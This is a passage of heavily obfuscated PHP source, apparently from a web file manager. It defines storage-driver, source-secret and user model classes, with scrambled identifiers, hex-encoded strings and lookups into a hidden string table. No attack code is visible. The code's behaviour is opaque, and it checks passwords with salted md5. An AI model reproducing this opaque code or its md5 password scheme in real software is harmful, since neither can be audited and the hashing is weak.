$¸Íİşö = $”¶ ˆ¦·->where($†„¡”¾Ğ)->find(); $¢ééÊå± = $¸Íİşö[$Â¦ãæ×ç[485]] == $Â¦ãæ×ç[91]; $Ì™¬Õœì = $”¶ ˆ¦·->fileNameAuto($¸Íİşö[$Â¦ãæ×ç[192]], $¸Íİşö[$Â¦ãæ×ç[32]], REPEAT_RENAME_FOLDER, $¢ééÊå±); if ($Ì™¬Õœì != $¸Íİşö[$Â¦ãæ×ç[32]]) { $”¶ ˆ¦·->rename($˜ÒåÜ, $Ì™¬Õœì); } $”¶ ˆ¦·->where($†„¡”¾Ğ)->setField($Â¦ãæ×ç[505], 0); $”ãĞİ¸Î->eventRecycle($˜ÒåÜ, $Â¦ãæ×ç[2301]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x73\x6f\165\162\x63\145\123\x65\143\x72\145\x74\x4c\151\163\x74"; public $field = array("\x73\x6f\x75\x72\x63\x65\x49\x44", "\164\x79\160\145\111\104", "\x63\162\145\x61\x74\145\x55\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\164\157\162\141\147\145\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\151\x7a\x65\x4d\x61\x78", "\x73\x79\163\x74\x65\155", "\144\x65\146\141\x75\x6c\164", "\144\162\151\x76\145\162", "\143\157\156\x66\x69\x67"); public function listData($Ò…›”¬š = false, $½¦Ì‰ƒ = "\x6d\x6f\144\151\x66\x79\x54\151\155\145", $–ã«úñğ = false) { $¨£¨· =& $_SERVER[¿ğÚ‰±–]; $èìòßû = parent::listData($Ò…›”¬š, $½¦Ì‰ƒ, $–ã«úñğ); if ($Ò…›”¬š) { return $èìòßû; } $®›ôì¤ = array(); if ($GLOBALS[$¨£¨·[2302]]) { $®›ôì¤ = $this->ioSizeUseGet(array_to_keyvalue($èìòßû, $¨£¨·[12], $¨£¨·[475])); } foreach ($èìòßû as $ëáŒíÇŸ => $äíĞÓ°) { unset($èìòßû[$ëáŒíÇŸ][$¨£¨·[6]]); $èìòßû[$ëáŒíÇŸ][$¨£¨·[1964]] = isset($®›ôì¤[$äíĞÓ°[$¨£¨·[475]]]) ? $®›ôì¤[$äíĞÓ°[$¨£¨·[475]]] : 0; } return $èìòßû; } public function ioSizeUseGet($¨€ÖÑ—Ã) { $¾ĞáÀ¯Ç =& $_SERVER[¿ğÚ‰±–]; if (!$¨€ÖÑ—Ã) { return array(); } $‚ù•ï‹¸ = $¾ĞáÀ¯Ç[2303] . implode($¾ĞáÀ¯Ç[50], $¨€ÖÑ—Ã); $Š¬¶£úÊ = Cache::get($‚ù•ï‹¸); if ($Š¬¶£úÊ) { return $Š¬¶£úÊ; } $øĞ’¢‚À = array($¾ĞáÀ¯Ç[895] => $¾ĞáÀ¯Ç[475], $¾ĞáÀ¯Ç[2304] => $¾ĞáÀ¯Ç[79]); $”ÍìŒ² = array($¾ĞáÀ¯Ç[895] => array($¾ĞáÀ¯Ç[7], $¨€ÖÑ—Ã)); $Š¬¶£úÊ = Model($¾ĞáÀ¯Ç[867])->field($øĞ’¢‚À)->where($”ÍìŒ²)->group($¾ĞáÀ¯Ç[895])->select(); $Š¬¶£úÊ = array_to_keyvalue($Š¬¶£úÊ, $¾ĞáÀ¯Ç[475], $¾ĞáÀ¯Ç[79]); Cache::set($‚ù•ï‹¸, $Š¬¶£úÊ, 600); return $Š¬¶£úÊ; } public function getConfig($ôş’ö¦å) { $çå½úÆ¾ = parent::listData($ôş’ö¦å); return json_decode($çå½úÆ¾[$_SERVER[¿ğÚ‰±–][6]], !0); } public function update($ÃàåÁåí, $âÑµÔš‘) { $îçÎôº =& $_SERVER[¿ğÚ‰±–]; $îÇ¿õùˆ = $âÑµÔš‘[$îçÎôº[32]]; $‡²ñ÷“Å = array_to_keyvalue(parent::listData(), $îçÎôº[32]); if (isset($‡²ñ÷“Å[$îÇ¿õùˆ]) && $‡²ñ÷“Å[$îÇ¿õùˆ][$îçÎôº[475]] != $ÃàåÁåí) { return !1; } $this->checkPwd($ÃàåÁåí, $âÑµÔš‘); if (isset($âÑµÔš‘[$îçÎôº[2305]]) && $âÑµÔš‘[$îçÎôº[2305]] == $îçÎôº[91]) { $this->checkConfig($âÑµÔš‘); } unset($âÑµÔš‘[$îçÎôº[2305]]); $ŒâøÖœô = parent::update($ÃàåÁåí, $âÑµÔš‘); if ($ŒâøÖœô && $âÑµÔš‘[$îçÎôº[37]]) { $Á¾éì›Ğ = 0; foreach ($‡²ñ÷“Å as $ò–‹´°) { if ($ò–‹´°[$îçÎôº[37]] && $ò–‹´°[$îçÎôº[475]] != $ÃàåÁåí) { $Á¾éì›Ğ = $ò–‹´°[$îçÎôº[475]]; parent::update($ò–‹´°[$îçÎôº[475]], array($îçÎôº[37] => 0)); } } $this->updateBackup($ÃàåÁåí, $Á¾éì›Ğ); } return $ŒâøÖœô; } public function add($à²‹“–Û) { $×€Œ„§û =& $_SERVER[¿ğÚ‰±–]; $ÍÛØ÷İ = array_to_keyvalue(parent::listData(), $×€Œ„§û[32]); if (isset($ÍÛØ÷İ[$à²‹“–Û[$×€Œ„§û[32]]])) { return !1; } $this->checkConfig($à²‹“–Û); $¼¤Ú†šõ = parent::insert($à²‹“–Û); if ($¼¤Ú†šõ && $à²‹“–Û[$×€Œ„§û[37]]) { foreach ($ÍÛØ÷İ as $Ê±ˆ·‡) { if ($Ê±ˆ·‡[$×€Œ„§û[37]]) { parent::update($Ê±ˆ·‡[$×€Œ„§û[475]], array($×€Œ„§û[37] => 0)); } } } return $¼¤Ú†šõ; } public function updateBackup($”†ó¯Åè, $ãìëúØå) { $Ğ®±Á¯¬ =& $_SERVER[¿ğÚ‰±–]; if (!$ãìëúØå) { return; } $øŠÊÎ» = Model($Ğ®±Á¯¬[826])->config(); if ($øŠÊÎ»[$Ğ®±Á¯¬[1747]] != $Ğ®±Á¯¬[91] || $øŠÊÎ»[$Ğ®±Á¯¬[830]] != $ãìëúØå) { return; } $í†íØ¥ = Model($Ğ®±Á¯¬[848])->get($Ğ®±Á¯¬[861]); $í†íØ¥ = json_decode($í†íØ¥, !0); if (!$í†íØ¥) { return; } $í†íØ¥[$Ğ®±Á¯¬[830]] = $”†ó¯Åè; Model($Ğ®±Á¯¬[848])->set(array($Ğ®±Á¯¬[861] => $í†íØ¥)); } public function checkPwd($ÈŠÄ¯¾, &$Ô·’¸¼) { $¨ëıÄüû =& $_SERVER[¿ğÚ‰±–]; if (empty($Ô·’¸¼[$¨ëıÄüû[6]])) { return; } $ß³®–Üä = json_decode($Ô·’¸¼[$¨ëıÄüû[6]], !0); $ÙøÔ·û = $¨ëıÄüû[12]; $ûïõúµ” = array($¨ëıÄüû[2306], $¨ëıÄüû[2307], $¨ëıÄüû[974]); foreach ($ûïõúµ” as $è”ÇÔî) { if (isset($ß³®–Üä[$è”ÇÔî])) { $ÙøÔ·û = $è”ÇÔî; break; } } if (!$ÙøÔ·û) { return; } $°õÌé¤û = $this->getConfig($ÈŠÄ¯¾); $Âş­œ²© = $°õÌé¤û[$ÙøÔ·û]; $é”ÅÒØ£ = $ß³®–Üä[$ÙøÔ·û]; if ($é”ÅÒØ£ == str_repeat($¨ëıÄüû[220], strlen($Âş­œ²©))) { $ß³®–Üä[$ÙøÔ·û] = $Âş­œ²©; $Ô·’¸¼[$¨ëıÄüû[6]] = json_encode($ß³®–Üä); } else { if ($é”ÅÒØ£ != $Âş­œ²©) { $Ô·’¸¼[$¨ëıÄüû[2305]] = $¨ëıÄüû[91]; } } } public function checkConfig(&$º£¶è‘, $àî€£Ùó = false) { $ï¥èõË· =& $_SERVER[¿ğÚ‰±–]; $¦Àô³ÒÂ = strtolower($º£¶è‘[$ï¥èõË·[98]]); $˜ôË‚Î = json_decode($º£¶è‘[$ï¥èõË·[6]], !0); foreach ($˜ôË‚Î as $¤€ê¡¨Ñ => $Èó­åš•) { if (is_string($Èó­åš•)) { $˜ôË‚Î[$¤€ê¡¨Ñ] = trim($Èó­åš•); } } $˜ôË‚Î[$ï¥èõË·[2308]] = rand_string(6); $õåş§¸¥ = $GLOBALS[$ï¥èõË·[6]][$ï¥èõË·[92]][$ï¥èõË·[903]]; $Ñ·˜‰®Ù = isset($õåş§¸¥[$¦Àô³ÒÂ]) ? $õåş§¸¥[$¦Àô³ÒÂ] : ucfirst($¦Àô³ÒÂ); $ÈáøÃËø = $ï¥èõË·[77] . $Ñ·˜‰®Ù; if (!$Ñ·˜‰®Ù || !class_exists($ÈáøÃËø)) { if ($àî€£Ùó) { return LNG($ï¥èõË·[2309]); } write_log(array($ï¥èõË·[2310], $º£¶è‘, get_caller_info()), $ï¥èõË·[215]); show_json(LNG($ï¥èõË·[2309]), !1, $º£¶è‘); } $ıŞ¶ãæá = new $ÈáøÃËø($˜ôË‚Î); if (in_array($¦Àô³ÒÂ, $ıŞ¶ãæá->objectDriver)) { try { if (!$ıŞ¶ãæá->isBucketCors() && !$ıŞ¶ãæá->setBucketCors()) { $ÎÈæ»¼ = LNG($ï¥èõË·[2311]); $ÎÈæ»¼ .= $ï¥èõË·[2312] . LNG($ï¥èõË·[2313]); } } catch (Exception $ö¼µá“) { $ÎÈæ»¼ = $ö¼µá“->getMessage(); } if (isset($ÎÈæ»¼)) { return $this->_parseError($ÎÈæ»¼, $¦Àô³ÒÂ, $àî€£Ùó); } if ($¦Àô³ÒÂ == $ï¥èõË·[68] && !$ıŞ¶ãæá->checkRegion()) { return $this->_parseError(LNG($ï¥èõË·[2314]), $¦Àô³ÒÂ, $àî€£Ùó); } } $ÜŠêÍÓ¯ = rtrim($˜ôË‚Î[$ï¥èõË·[1269]], $ï¥èõË·[8]) . $ï¥èõË·[8]; $àÉÍÑÖ· = $ıŞ¶ãæá->getPath($ÜŠêÍÓ¯ . $ï¥èõË·[1273]); try { if ($¦Àô³ÒÂ == $ï¥èõË·[109]) { $ıŞ¶ãæá->mkdir($ÜŠêÍÓ¯); } $¹Ü¸×ï™ = $ıŞ¶ãæá->mkfile($àÉÍÑÖ·); if (!$¹Ü¸×ï™) { $ÎÈæ»¼ = LNG($ï¥èõË·[2311]); } } catch (Exception $ö¼µá“) { $ÎÈæ»¼ = $ö¼µá“->getMessage(); } if (isset($ÎÈæ»¼)) { return $this->_parseError($ÎÈæ»¼, $¦Àô³ÒÂ, $àî€£Ùó); } $˜ôË‚Î[$ï¥èõË·[1269]] = $ÜŠêÍÓ¯; $º£¶è‘[$ï¥èõË·[6]] = json_encode($˜ôË‚Î); $º£¶è‘[$ï¥èõË·[98]] = $Ñ·˜‰®Ù; return !0; } private function _parseError($–èè¤Ÿ, $•äùºš‰, $ÖäÙ‰Æ¹ = false) { $‘ú¥†Ô¤ =& $_SERVER[¿ğÚ‰±–]; if ($•äùºš‰ == $‘ú¥†Ô¤[68] && stripos($–èè¤Ÿ, $‘ú¥†Ô¤[2315])) { $Â‹®Ş = explode($‘ú¥†Ô¤[10], $–èè¤Ÿ); $Æ³¶òßº = isset($Â‹®Ş[1]) ? $Â‹®Ş[1] : $‘ú¥†Ô¤[12]; $¼‘„Šüô = array($‘ú¥†Ô¤[2316] => LNG($‘ú¥†Ô¤[2317]), $‘ú¥†Ô¤[2318] => LNG($‘ú¥†Ô¤[2319])); if (isset($¼‘„Šüô[$Æ³¶òßº])) { $–èè¤Ÿ = $¼‘„Šüô[$Æ³¶òßº]; } } if (stripos($–èè¤Ÿ, $‘ú¥†Ô¤[2320]) === 0) { $‘ú˜ßÕ = strpos($–èè¤Ÿ, $‘ú¥†Ô¤[178]); if ($‘ú˜ßÕ === !1) { $‘ú˜ßÕ = strpos($–èè¤Ÿ, $‘ú¥†Ô¤[4]); } if ($‘ú˜ßÕ !== !1) { $–èè¤Ÿ = substr($–èè¤Ÿ, $‘ú˜ßÕ + 1); } } $–èè¤Ÿ = LNG($‘ú¥†Ô¤[1276]) . $–èè¤Ÿ; if ($ÖäÙ‰Æ¹) { return $–èè¤Ÿ; } show_json($–èè¤Ÿ, !1); } public function driverListSystem() { $‚Í µé =& $_SERVER[¿ğÚ‰±–]; $­‰‡°“ = parent::listData(); $ÁŞÀ¿Æ“ = array(); foreach ($­‰‡°“ as $”ÛíÀôè) { unset($”ÛíÀôè[$‚Í µé[231]], $”ÛíÀôè[$‚Í µé[88]]); $”ÛíÀôè[$‚Í µé[6]] = json_decode($”ÛíÀôè[$‚Í µé[6]], !0); $ÁŞÀ¿Æ“[] = $”ÛíÀôè; } return $ÁŞÀ¿Æ“; } public function defaultDriver() { $ù·ôÊÅ÷ =& $_SERVER[¿ğÚ‰±–]; $íİé×‡‹ = parent::listData(); $Ûîææª = array_filter_by_field($íİé×‡‹, $ù·ôÊÅ÷[37], 1); $Ûîææª = $Ûîææª[0]; if ($Ûîææª) { $Ûîææª[$ù·ôÊÅ÷[6]] = json_decode($Ûîææª[$ù·ôÊÅ÷[6]], !0); } return $Ûîææª; } public function driverInfo($ü›İ€èß) { $¾õ­¤Ó =& $_SERVER[¿ğÚ‰±–]; $ØÇ¶öŠü = array_to_keyvalue(parent::listData(), $¾õ­¤Ó[475]); if (!isset($ØÇ¶öŠü[$ü›İ€èß])) { return !1; } $³¯Ï€° = $ØÇ¶öŠü[$ü›İ€èß]; $³¯Ï€°[$¾õ­¤Ó[6]] = json_decode($³¯Ï€°[$¾õ­¤Ó[6]], !0); return $³¯Ï€°; } public function remove($×÷‘ïƒ) { $this->removeShareItems($×÷‘ïƒ); return parent::remove($×÷‘ïƒ); } public function removeWithFile($Î¼èÒÃˆ, $¬¡Ô°ä°, $éßÚ…˜³, $Ÿüû„¾™ = false) { $úô¦Ïñú =& $_SERVER[¿ğÚ‰±–]; $¡ìèÙéõ = array($úô¦Ïñú[895] => $Î¼èÒÃˆ); $¥ÈšÕ£Ñ = Model($úô¦Ïñú[544])->where($¡ìèÙéõ)->count(); $ì¬ƒ¹• = Model($úô¦Ïñú[544])->where($¡ìèÙéõ)->sum($úô¦Ïñú[79]); $®„Ò•ü¾ = $¬¡Ô°ä° . $úô¦Ïñú[2321] . $Î¼èÒÃˆ; $İÑ¹ã¹ = LNG($¬¡Ô°ä° == $úô¦Ïñú[620] ? $úô¦Ïñú[2322] : $úô¦Ïñú[2323]); $ªÆìíÆ¢ = new TaskFileTransfer($®„Ò•ü¾, $úô¦Ïñú[215], $¥ÈšÕ£Ñ, $İÑ¹ã¹ . $úô¦Ïñú[462] . $éßÚ…˜³[$úô¦Ïñú[32]] . $úô¦Ïñú[214] . $Î¼èÒÃˆ); $ªÆìíÆ¢->task[$úô¦Ïñú[841]] = (double) $ì¬ƒ¹•; $Ö¡èšÒ½ = KodIO::defaultDriver(); $Ì¥ƒ µ = $Ö¡èšÒ½[$úô¦Ïñú[475]]; $©ä×½±ğ = $ÛìÌëÊ = $Ä«à‰– = array(); $é×ñÀÕí = Model($úô¦Ïñú[230])->where($¡ìèÙéõ)->field($úô¦Ïñú[2324])->select(); foreach ($é×ñÀÕí as $‚œŞğª¢) { $ä·ƒÃªˆ = $‚œŞğª¢[$úô¦Ïñú[541]]; if ($Ÿüû„¾™) { $ÛìÌëÊ[] = $ä·ƒÃªˆ; continue; } $É«ï­Îæ = $‚œŞğª¢[$úô¦Ïñú[87]]; $ˆÌ¬Ç”å = get_path_father($É«ï­Îæ); $Ä«à‰–[] = $ˆÌ¬Ç”å; $ˆÌ¬Ç”å = str_replace("\x7b\151\x6f\x3a{$Î¼èÒÃˆ}\175\57", "\x7b\151\x6f\72{$Ì¥ƒ µ}\x7d\x2f", $ˆÌ¬Ç”å); if (!IO::exist($É«ï­Îæ)) { $©ä×½±ğ[] = $ä·ƒÃªˆ; $ªÆìíÆ¢->updateFileEnd($‚œŞğª¢[$úô¦Ïñú[32]], $‚œŞğª¢[$úô¦Ïñú[79]]); write_log($úô¦Ïñú[2325] . $É«ï­Îæ, $úô¦Ïñú[1907]); continue; } $óå–ï‹É = IO::move($É«ï­Îæ, $ˆÌ¬Ç”å, REPEAT_RENAME); if (!$óå–ï‹É) { $ÛìÌëÊ[] = $ä·ƒÃªˆ; $ªÆìíÆ¢->updateFileEnd($‚œŞğª¢[$úô¦Ïñú[32]], $‚œŞğª¢[$úô¦Ïñú[79]]); write_log($úô¦Ïñú[2326] . $É«ï­Îæ, $úô¦Ïñú[1907]); continue; } $¡ìèÙéõ = array($úô¦Ïñú[541] => $ä·ƒÃªˆ); $±·êÚÒø = array($úô¦Ïñú[895] => $Ì¥ƒ µ, $úô¦Ïñú[87] => $óå–ï‹É); Model($úô¦Ïñú[230])->where($¡ìèÙéõ)->save($±·êÚÒø); } $Ğ»£ÖßÃ = $ªÆìíÆ¢->task; if (!$Ÿüû„¾™) { Cache::set($®„Ò•ü¾, $Ğ»£ÖßÃ); } $ªÆìíÆ¢->end(); $©ä×½±ğ = array_unique($©ä×½±ğ); $ÛìÌëÊ = array_unique($ÛìÌëÊ); if (!$Ÿüû„¾™ && ($©ä×½±ğ || $ÛìÌëÊ)) { $¢°çĞïø = array(); if ($©ä×½±ğ) { $¢°çĞïø[] = sprintf(LNG($úô¦Ïñú[2327]), count($©ä×½±ğ)); } if ($ÛìÌëÊ) { $¢°çĞïø[] = sprintf(LNG($úô¦Ïñú[2328]), count($ÛìÌëÊ)); } $¢°çĞïø = sprintf(LNG($úô¦Ïñú[2329]), implode($úô¦Ïñú[2330], $¢°çĞïø)) . $úô¦Ïñú[2331] . date($úô¦Ïñú[2332]) . $úô¦Ïñú[2333]; if ($¬¡Ô°ä° == $úô¦Ïñú[1944]) { $¢°çĞïø .= $úô¦Ïñú[2334] . LNG($úô¦Ïñú[2335]); } $Ğ»£ÖßÃ[$úô¦Ïñú[1271]] = $¢°çĞïø; Cache::set($®„Ò•ü¾, $Ğ»£ÖßÃ); unset($éßÚ…˜³[$úô¦Ïñú[6]]); $©«É…ùº = array($úô¦Ïñú[475] => $Î¼èÒÃˆ, $úô¦Ïñú[2214] => $úô¦Ïñú[620], $úô¦Ïñú[32] => $éßÚ…˜³[$úô¦Ïñú[32]], $úô¦Ïñú[1294] => $éßÚ…˜³); Hook::trigger($úô¦Ïñú[1788], array($úô¦Ïñú[1294] => $©«É…ùº, $úô¦Ïñú[1304] => !0)); show_json($¢°çĞïø, !1, 100111); } if ($¬¡Ô°ä° == $úô¦Ïñú[620]) { return !0; } if ($©ä×½±ğ || $ÛìÌëÊ) { $•›Ù× = array_merge($©ä×½±ğ, $ÛìÌëÊ); $•›Ù× = array_filter(array_unique($•›Ù×)); $this->removeByFileID($•›Ù×); } if ($Ä«à‰–) { $Ä«à‰– = array_filter(array_unique($Ä«à‰–)); foreach ($Ä«à‰– as $É«ï­Îæ) { $Õë›şšğ = IO::has($É«ï­Îæ, !0); if (!$Õë›şšğ[$úô¦Ïñú[239]] && !$Õë›şšğ[$úô¦Ïñú[240]]) { IO::remove($É«ï­Îæ); } } } return $this->remove($Î¼èÒÃˆ); } private function removeByFileID($¦¼™…Ú¤ = array()) { $‚¯ˆë† =& $_SERVER[¿ğÚ‰±–]; if (empty($¦¼™…Ú¤)) { return; } $€¢Ñı°¶ = array($‚¯ˆë†[541] => array($‚¯ˆë†[7], $¦¼™…Ú¤)); $Ïº£’”• = Model($‚¯ˆë†[1425])->where($€¢Ñı°¶)->field($‚¯ˆë†[193])->select(); if (!$Ïº£’”•) { return Model($‚¯ˆë†[544])->remove($¦¼™…Ú¤); } $Ïº£’”• = array_to_keyvalue($Ïº£’”•, $‚¯ˆë†[12], $‚¯ˆë†[193]); foreach ($Ïº£’”• as $ß»ğ¼æÄ) { Model($‚¯ˆë†[902])->removeNow($ß»ğ¼æÄ, !1); } } private function removeShareItems($€©¬Ÿ«á) { $ÃšÄÑ¹ =& $_SERVER[¿ğÚ‰±–]; $Ì—Õæ±€ = "\x7b\151\157\72{$€©¬Ÿ«á}\x7d\x2f"; $¾ˆ‘„Ë = array($ÃšÄÑ¹[193] => 0, $ÃšÄÑ¹[1264] => array($ÃšÄÑ¹[459], "{$Ì—Õæ±€}\x25")); $Õ”ÑÈ = Model($ÃšÄÑ¹[1955])->where($¾ˆ‘„Ë)->field($ÃšÄÑ¹[665])->select(); if (empty($Õ”ÑÈ)) { return; } $ëó³áÔ = array_to_keyvalue($Õ”ÑÈ, $ÃšÄÑ¹[12], $ÃšÄÑ¹[665]); Model($ÃšÄÑ¹[664])->remove($ëó³áÔ); } } goto dóï‘„õ†; fäŠ¶•Ë”„: class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\155\145" => "\165\x73\145\162\137\x6d\145\x74\x61", "\x6d\145\164\141\106\151\145\154\144" => "\165\163\x65\162\x49\x44"); protected $simpleField = "\x75\163\145\162\111\104\54\x6e\151\143\153\x4e\x61\x6d\x65\54\x6e\x61\155\x65\54\x61\166\141\164\141\162\x2c\163\145\x78\54\163\164\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ÒĞ¢Åù‡) { $‚÷×·äÍ =& $_SERVER[¿ğÚ‰±–]; $Ñğî­¤² = $‚÷×·äÍ[2455]; return array($‚÷×·äÍ[2058] => array($ÒĞ¢Åù‡[0], $Ñğî­¤²), $‚÷×·äÍ[2060] => array($ÒĞ¢Åù‡[0], $Ñğî­¤²), $‚÷×·äÍ[2456] => array($ÒĞ¢Åù‡[0], $Ñğî­¤²)); } protected function getInfo($ñÆÂ•Ø·, $ß °·™õ = false) { $­Ç‡ı»İ = $this->getInfoSimple($ñÆÂ•Ø·); if (!is_array($­Ç‡ı»İ)) { return array(); } if ($ß °·™õ) { return $this->_getInfoApply($­Ç‡ı»İ); } return $this->cacheFunctionGet($_SERVER[¿ğÚ‰±–][2062], $ñÆÂ•Ø·); } protected function getInfoFull($à„òÆüå, $ê­öãí¢ = false) { $îÚ§ší¡ = $this->getInfoSimple($à„òÆüå); if (!is_array($îÚ§ší¡)) { return array(); } if ($ê­öãí¢) { return $this->_getInfoApply($îÚ§ší¡, !0); } return $this->cacheFunctionGet($_SERVER[¿ğÚ‰±–][2457], $à„òÆüå); } private function _getInfoApply($£¢†å’Ù, $ø÷¶ûæ = false) { $¹Ê©éĞÎ =& $_SERVER[¿ğÚ‰±–]; if (!$£¢†å’Ù) { return $£¢†å’Ù; } $ÊíÆ¯â› = md5($¹Ê©éĞÎ[2458] . $£¢†å’Ù[$¹Ê©éĞÎ[974]] . $¹Ê©éĞÎ[2459] . $£¢†å’Ù[$¹Ê©éĞÎ[32]]); $£¢†å’Ù = $this->_listDataApplyItem($£¢†å’Ù); $”ªò—ö = Model($¹Ê©éĞÎ[1425])->metaGet($£¢†å’Ù[$¹Ê©éĞÎ[90]][$¹Ê©éĞÎ[193]]); $£¢†å’Ù[$¹Ê©éĞÎ[2460]] = $ÊíÆ¯â›; $£¢†å’Ù[$¹Ê©éĞÎ[90]][$¹Ê©éĞÎ[2256]] = isset($”ªò—ö[$¹Ê©éĞÎ[2257]]) ? $”ªò—ö[$¹Ê©éĞÎ[2257]] : null; if ($ø÷¶ûæ) { $£¢†å’Ù[$¹Ê©éĞÎ[539]] = $this->metaGet($£¢†å’Ù[$¹Ê©éĞÎ[1777]]); } return $£¢†å’Ù; } protected function getInfoSimple($˜è€€Ó², $áúÅüà = false) { $›éş–şÍ =& $_SERVER[¿ğÚ‰±–]; if (!$˜è€€Ó²) { return array(); } if ($áúÅüà) { $¹ĞŒà¼ = $this->where(array($›éş–şÍ[1777] => intval($˜è€€Ó²)))->find(); if (!is_array($¹ĞŒà¼)) { return array(); } $¹ĞŒà¼[$›éş–şÍ[2461]] = Action($›éş–şÍ[2462])->parseUrl($¹ĞŒà¼[$›éş–şÍ[2461]]); return $¹ĞŒà¼; } return $this->cacheFunctionGet($›éş–şÍ[2063], $˜è€€Ó²); } protected function getInfoSimpleOuter($ƒÀáöøı) { $œ¥·ëâ… =& $_SERVER[¿ğÚ‰±–]; if (!$ƒÀáöøı || $ƒÀáöøı == 0) { return array($œ¥·ëâ…[1777] => $œ¥·ëâ…[228], $œ¥·ëâ…[32] => $œ¥·ëâ…[176] . LNG($œ¥·ëâ…[2463]) . $œ¥·ëâ…[178], $œ¥·ëâ…[2461] => STATIC_PATH . $œ¥·ëâ…[2464]); } $ÜÈæ—¿ = $this->cacheFunctionGet($œ¥·ëâ…[2063], $ƒÀáöøı); $øÔ ßÜ = array_field_key($ÜÈæ—¿, explode($œ¥·ëâ…[50], $this->simpleField)); if (!$øÔ ßÜ) { return array($œ¥·ëâ…[1777] => $œ¥·ëâ…[1280], $œ¥·ëâ…[32] => $œ¥·ëâ…[176] . LNG($œ¥·ëâ…[2465]) . $œ¥·ëâ…[178], $œ¥·ëâ…[2461] => STATIC_PATH . $œ¥·ëâ…[2466]); } $øÔ ßÜ[$œ¥·ëâ…[2461]] = Action($œ¥·ëâ…[2462])->parseUrl($øÔ ßÜ[$œ¥·ëâ…[2461]]); return $øÔ ßÜ; } protected function groupUser($³Ëš†Í) { } public static function errorLang($‰ı±½×˜) { $«Ù§šø =& $_SERVER[¿ğÚ‰±–]; $¢–õ ‚ß = array(self::ERROR_USER_NOT_EXISTS => $«Ù§šø[2467], self::ERROR_USER_PASSWORD_ERROR => $«Ù§šø[2468], self::ERROR_USER_EXIST_NAME => $«Ù§šø[2469], self::ERROR_USER_EXIST_PHONE => $«Ù§šø[2470], self::ERROR_USER_EXIST_EMAIL => $«Ù§šø[2471], self::ERROR_USER_LOGIN_LOCK => $«Ù§šø[2472], self::ERROR_IP_NOT_ALLOW => $«Ù§šø[2473], self::ERROR_USER_EXIST_NICKNAME => $«Ù§šø[2474]); $­…ûÖÛª = LNG($¢–õ ‚ß[$‰ı±½×˜]); if ($‰ı±½×˜ == self::ERROR_USER_LOGIN_LOCK) { $ò£Œß‘ = (int) Model($«Ù§šø[2475])->get($«Ù§šø[2476]); if ($ò£Œß‘ > 60) { $­…ûÖÛª = str_replace($«Ù§šø[91], ceil($ò£Œß‘ / 60), $­…ûÖÛª); } } return $­…ûÖÛª; } public function getInfoByMeta($ˆà‹Ò«, $ÁºõÙó) { $êÄÍéµ =& $_SERVER[¿ğÚ‰±–]; $¡ıŠ×¼ú = Model($êÄÍéµ[2477])->where(array($êÄÍéµ[97] => $ˆà‹Ò«, $êÄÍéµ[450] => $ÁºõÙó))->find(); if ($¡ıŠ×¼ú) { return $this->getInfo($¡ıŠ×¼ú[$êÄÍéµ[1777]]); } return !1; } public function userLoginCheck($¿¾µƒêİ, $–€´³¢á) { $›«ö§ƒÓ =& $_SERVER[¿ğÚ‰±–]; $™ï¤ÈÊ£ = $this->userLoginFind($¿¾µƒêİ); if (!$™ï¤ÈÊ£) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($™ï¤ÈÊ£[$›«ö§ƒÓ[1777]], $–€´³¢á)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($™ï¤ÈÊ£[$›«ö§ƒÓ[1777]]); } public function userLoginFind($ Â¤š Ş) { $²ôëÅ½¯ =& $_SERVER[¿ğÚ‰±–]; $ÌæäÑ–µ = array($²ôëÅ½¯[32] => $ Â¤š Ş, $²ôëÅ½¯[2264] => $ Â¤š Ş, $²ôëÅ½¯[381] => $ Â¤š Ş, $²ôëÅ½¯[2478] => $ Â¤š Ş, $²ôëÅ½¯[1085] => $²ôëÅ½¯[1087]); if ($this->nickNameRpt()) { unset($ÌæäÑ–µ[$²ôëÅ½¯[2264]]); } return $this->where($ÌæäÑ–µ)->find(); } public function clearCache($„èÔÎƒ») { $¥ë·…²ß =& $_SERVER[¿ğÚ‰±–]; $this->cacheFunctionClear($¥ë·…²ß[2062], $„èÔÎƒ»); $this->cacheFunctionClear($¥ë·…²ß[2063], $„èÔÎƒ»); $this->cacheFunctionClear($¥ë·…²ß[2457], $„èÔÎƒ»); } public function userPasswordCheck($˜Å¥·£, $§Ï§ûÛ÷) { $Õ‘Æ¢€ê =& $_SERVER[¿ğÚ‰±–]; $¸• ŒİÜ = $this->where(array($Õ‘Æ¢€ê[1777] => intval($˜Å¥·£)))->find(); $—Ñò¨ ’ = $this->metaGet($˜Å¥·£); $ü—ø½ = isset($—Ñò¨ ’[$Õ‘Æ¢€ê[2479]]) ? $—Ñò¨ ’[$Õ‘Æ¢€ê[2479]] : $Õ‘Æ¢€ê[12]; if (md5($ü—ø½ . trim($§Ï§ûÛ÷)) !== $¸• ŒİÜ[$Õ‘Æ¢€ê[974]]) { return !1; } return !0; } public function userAdd($êøµş›¢) { $Ù€±×Òƒ =& $_SERVER[¿ğÚ‰±–]; $ûÏÇË = array($Ù€±×Òƒ[494] => $êøµş›¢[$Ù€±×Òƒ[32]], $Ù€±×Òƒ[2480] => $êøµş›¢[$Ù€±×Òƒ[2182]], $Ù€±×Òƒ[2481] => isset($êøµş›¢[$Ù€±×Òƒ[381]]) ? $êøµş›¢[$Ù€±×Òƒ[381]] : $Ù€±×Òƒ[12], $Ù€±×Òƒ[2482] => isset($êøµş›¢[$Ù€±×Òƒ[2478]]) ? $êøµş›¢[$Ù€±×Òƒ[2478]] : $Ù€±×Òƒ[12], $Ù€±×Òƒ[2483] => isset($êøµş›¢[$Ù€±×Òƒ[2264]]) ? $êøµş›¢[$Ù€±×Òƒ[2264]] : $êøµş›¢[$Ù€±×Òƒ[32]], 